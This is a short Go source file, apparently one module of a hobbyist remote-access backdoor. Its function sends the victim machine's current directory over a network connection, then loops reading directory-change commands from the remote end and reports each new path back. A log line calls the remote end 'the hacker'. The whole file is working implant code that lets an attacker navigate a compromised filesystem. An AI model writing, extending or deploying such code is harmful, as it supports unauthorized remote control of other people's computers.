package move

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
)

func NavigateFileSystem(connection net.Conn) (err error) {
	// send the present location to the server
	pwd, err := os.Getwd()
	if err != nil {
		fmt.Println("[_] Can't get present directory ")
	}
	fmt.Println(pwd)

	pwdRaw := pwd + "\n"
	nbytes, err := connection.Write([]byte(pwdRaw))
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println("[+] ", nbytes, " was written")

	CommandReader := bufio.NewReader(connection)

	loopControl := true

	for loopControl {

		userCommandRaw, err := CommandReader.ReadString('\n')
		if err != nil {
			fmt.Println("[-] unable to read command: ", err)
		}

		if userCommandRaw == "stop\n" {
			loopControl = false
			break
		}

		userCommand := strings.TrimSuffix(userCommandRaw, "\n")
		// cd ..
		// [cd, ...]
		commandArr := strings.Split(userCommand, " ")
		if len(commandArr) > 1 {
			dir2move := commandArr[1]
			err = os.Chdir(dir2move)
			if err != nil {
				fmt.Println("[-] Unable change directory: ", err)
			}
		}

		pwd, err = os.Getwd()
		if err != nil {
			fmt.Println(err)
		}
		nbyte, err := connection.Write([]byte(pwd))
		if err != nil {
			fmt.Println(err)
		}

		fmt.Println("[+] Pwd written to the hacker ", nbyte)
	}
	return
}
